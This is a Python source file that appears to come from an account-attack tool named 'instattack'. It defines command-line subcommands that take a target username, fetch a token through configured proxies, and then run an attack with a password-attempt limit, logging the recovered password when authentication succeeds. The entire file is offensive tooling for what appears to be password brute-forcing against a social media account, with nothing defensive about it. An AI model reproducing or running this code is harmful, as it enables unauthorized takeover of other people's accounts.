import asyncio

from instattack.core.attack import attack, get_token

from .base import Instattack
from .args import RequestArgs, ProxyArgs, PasswordArgs, TokenArgs


@Instattack.subcommand('attack')
class InstattackAttack(Instattack, RequestArgs, ProxyArgs, PasswordArgs, TokenArgs):

    async def retrieve_token(self, loop):
        return await get_token(
            loop,
            request_config=self.request_config(method='GET'),
            broker_config=self.broker_config(method='GET'),
            pool_config=self.pool_config(method='GET'),
        )

    async def attempt_attack(self, loop, token):
        return await attack(
            loop,
            token,
            self.user,
            pwlimit=self._pwlimit,
            request_config=self.request_config(method='POST'),
            broker_config=self.broker_config(method='POST'),
            pool_config=self.pool_config(method='POST'),
        )


@InstattackAttack.subcommand('get')
class AttackGet(InstattackAttack):
    pass


@InstattackAttack.subcommand('run')
class AttackRun(InstattackAttack):

    __name__ = 'Run Attack'

    def main(self, username):
        loop = asyncio.get_event_loop()

        self.user = loop.run_until_complete(self.get_user(username))
        if not self.user:
            return

        # Token will be None if an exception occured.
        token = loop.run_until_complete(self.retrieve_token(loop))
        if not token:
            self.log.error('Token retrieval failed.')
            return

        self.log.complete('Received Token', extra={'other': token})
        loop.run_until_complete(asyncio.sleep(0.25))
        result = loop.run_until_complete(self.attempt_attack(loop, token))
        if result:
            self.log.info(f'Authenticated User!', extra={
                'password': result.context.password
            })


@AttackGet.subcommand('token')
class GetToken(InstattackAttack):

    __name__ = 'Attack Get Token'

    def main(self):
        loop = asyncio.get_event_loop()

        # Token will be None if an exception occured.
        token = loop.run_until_complete(self.retrieve_token(loop))
        if not token:
            self.log.error('Token retrieval failed.')
            return

        self.log.complete('Received Token', extra={'other': token})
